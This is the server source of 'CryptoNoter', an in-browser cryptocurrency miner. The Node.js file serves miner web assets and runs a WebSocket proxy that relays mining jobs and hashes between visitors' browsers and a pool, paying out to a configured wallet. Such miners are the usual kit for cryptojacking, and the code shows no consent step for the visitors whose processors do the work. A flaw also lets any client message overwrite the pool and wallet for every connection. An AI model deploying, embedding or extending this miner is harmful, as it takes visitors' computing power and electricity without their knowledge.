/**
 * CryptoNoter v1.4
 * Open Source In-Browser Javascript Web Miner / Payout Towards Personal Wallet
 * THE ONLY In-Browser Web Miner That Supports Multi Cryptocurrency.
 */
var http = require('http'),
    https = require('https'),
    WebSocket = require("ws"),
    net = require('net'),
    fs = require('fs'),
    crypto = require("crypto");
	
const util = require('util');


var banner = fs.readFileSync(__dirname + '/banner', 'utf8');

// console.log(banner);
var conf = {};
// check if config file exists
if (fs.existsSync(__dirname + '/config.json')) {
  var conf = fs.readFileSync(__dirname + '/config.json', 'utf8');
  conf = JSON.parse(conf);
}

//heroku port
conf.lport = process.env.PORT || conf.lport;
conf.domain = process.env.DOMAIN || conf.domain;
conf.key = process.env.KEY || conf.key;
conf.cert = process.env.CERT || conf.cert;
conf.pool = process.env.POOL || conf.pool;
conf.addr = process.env.ADDR || conf.addr;
conf.pass = process.env.PASS || conf.pass;

if (!conf.lport) {
  console.error("Port (lport) needs to be defined in the config or via environment variable (PORT)");
  process.exit(1);
};

if (!conf.domain) {
  console.error("Domain (domain) needs to be defined in the config or via environment variable (DOMAIN)");
  process.exit(1);
}

if (!conf.pool) {
  console.error("Pool (pool) needs to be defined in the config or via environment variable (POOL)");
  process.exit(1);
}

if (!conf.addr) {
  console.error("Wallet Address (addr) needs to be defined in the config or via environment variable (ADDR)");
  process.exit(1);
}

//ssl support
const ssl = !!(conf.key && conf.cert);

const stats = (req, res) => {
    req.url = (req.url === '/') ? '/index.html' : req.url;
    fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
        if (err) {} else {
            if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain);
                if (req.url.match(/\.js$/)) {
                    res.setHeader('content-type', 'application/javascript');
                }
            } else {
                res.setHeader('Content-Type', 'application/octet-stream');
            }
            res.end(buf);
        }
    });
}

//ssl support
if (ssl) {
    var web = https.createServer({
        key: fs.readFileSync(conf.key),
        cert: fs.readFileSync(conf.cert)
    }, stats)
} else {
    var web = http.createServer(stats);
}

// Miner Proxy Srv
var srv = new WebSocket.Server({
    server: web,
    path: "/proxy",
    maxPayload: 256
});

//https://blockchain-coin-web-mining.com/proxy?
//pool_selected=blockchain-coin.asia:4444&
//wallet_selected=abLoc8Tu9UaYLs3ZkZxAptP9CsjvZ3G3W599Y9Kx8j5pRktsbCzm3KBYLhw69w8Tvefatpx3GNuBy1evdBTDzQvFBPeri7U9YVq

var pool_selected = false;
var wallet_selected = false;

srv.on('connection', (ws) => 
{
    var conn = {
        uid: null,
        pid: crypto.randomBytes(12).toString("hex"),
        workerId: null,
        found: 0,
        accepted: 0,
        ws: ws,
        pl: new net.Socket(),
    }

	if (typeof pool_selected == 'string') {
		var pool = pool_selected.split(':');
	} else {
		var pool = conf.pool.split(':');
	}

	if (false != wallet_selected) {
		conf.addr = wallet_selected;
	}

	// console.log(util.inspect(web, false, null));
	// console.log(util.inspect(srv, false, null));
	// console.log('');

    conn.pl.connect(pool[1], pool[0]);

    function ws2pool(data) 
	{
        var buf;
        data = JSON.parse(data);
		
        switch (data.type) 
		{
			
            case 'auth':
                {
                    conn.uid = data.params.site_key;
					
					pool_selected   = data.params.pool_selected;
					wallet_selected = data.params.wallet_selected;
					conf.addr 		= wallet_selected;
					
                    if (data.params.user) {
                        conn.uid += '@' + data.params.user;
                    }
                    buf = {
                        "method": "login",
                        "params": {
                            "login": conf.addr,
                            "pass": conf.pass,
                            "agent": "CryptoNoter"
                        },
                        "id": conn.pid
                    }
                    buf = JSON.stringify(buf) + '\n';
                    conn.pl.write(buf);
                    break;
                }
            case 'submit':
                {
                    conn.found++;
                    buf = {
                        "method": "submit",
                        "params": {
                            "id": conn.workerId,
                            "job_id": data.params.job_id,
                            "nonce": data.params.nonce,
                            "result": data.params.result
                        },
                        "id": conn.pid
                    }
                    buf = JSON.stringify(buf) + '\n';
                    conn.pl.write(buf);
                    break;
                }
            case 'keepalive':
                {
                    buf = {"status": "ok"};
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
					console.log('[<] Response: ' + buf + '\n');
                    break;
                }
        }
    }

    // Trans PoolSocket to WebSocket
    function pool2ws(data) {
        try {
            var buf;
            data = JSON.parse(data);
            if (data.id === conn.pid && data.result) {
                if (data.result.id) {
                    conn.workerId = data.result.id;
                    buf = {
                        "type": "authed",
                        "params": {
                            "token": "",
                            "hashes": conn.accepted
                        }
                    }
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                    buf = {
                        "type": "job",
                        "params": data.result.job
                    }
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                } else if (data.result.status === 'OK') {
                    conn.accepted++;
                    buf = {
                        "type": "hash_accepted",
                        "params": {
                            "hashes": conn.accepted
                        }
                    }
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                }
            }
            if (data.id === conn.pid && data.error) {
                if (data.error.code === -1) {
                    buf = {
                        "type": "banned",
                        "params": {
                            "banned": conn.pid
                        }
                    }
                } else {
                    buf = {
                        "type": "error",
                        "params": {
                            "error": data.error.message
                        }
                    }
                }
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
            if (data.method === 'job') {
                buf = {
                    "type": 'job',
                    "params": data.params
                }
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
        } catch (error) { console.warn('[!] Error: '+error.message) }
    }
    conn.ws.on('message', (data) => {
		
		var paramsles = JSON.parse(data);
		
		if (typeof paramsles.params !== 'undefined') {
			pool_selected   = paramsles.params.pool_selected;
			wallet_selected = paramsles.params.wallet_selected;
		}
		
        ws2pool(data);
		
        console.log('[>] Request: ' + conn.uid + '\n\n' + data + '\n');
    });
    conn.ws.on('error', (data) => {
        console.log('[!] ' + conn.uid + ' WebSocket ' + data + '\n');
        conn.pl.destroy();
    });
	
    conn.ws.on('close', () => {
        console.log('[!] ' + conn.uid + ' offline.\n');
        conn.pl.destroy();
    });
    conn.pl.on('data', function(data) {
        var linesdata = data;
        var lines = String(linesdata).split("\n");
        if (lines[1].length > 0) {
            console.log('[<] Response: ' + conn.pid + '\n\n' + lines[0] + '\n');
            console.log('[<] Response: ' + conn.pid + '\n\n' + lines[1] + '\n')
            pool2ws(lines[0]);
            pool2ws(lines[1]);
        } else {
            console.log('[<] Response: ' + conn.pid + '\n\n' + data + '\n');
            pool2ws(data);
        }
    });
	
	conn.ws.on('open', (data) => 
	{		
		var paramsles = JSON.parse(data);
		
		pool_selected   = paramsles.params.pool_selected;
		wallet_selected = paramsles.params.wallet_selected;
		conf.addr = wallet_selected;
    });
	
    conn.pl.on('error', (data) => {
        console.log('PoolSocket ' + data + '\n');
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
    conn.pl.on('close', () => {
        console.log('PoolSocket Closed.\n');
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
});

web.listen(conf.lport, conf.lhost, () => {
    // console.log(banner);
    // console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Wallet Add: ' + conf.addr + '\n');
    // console.log('----------------------------------------------------------------------------------------\n');
});
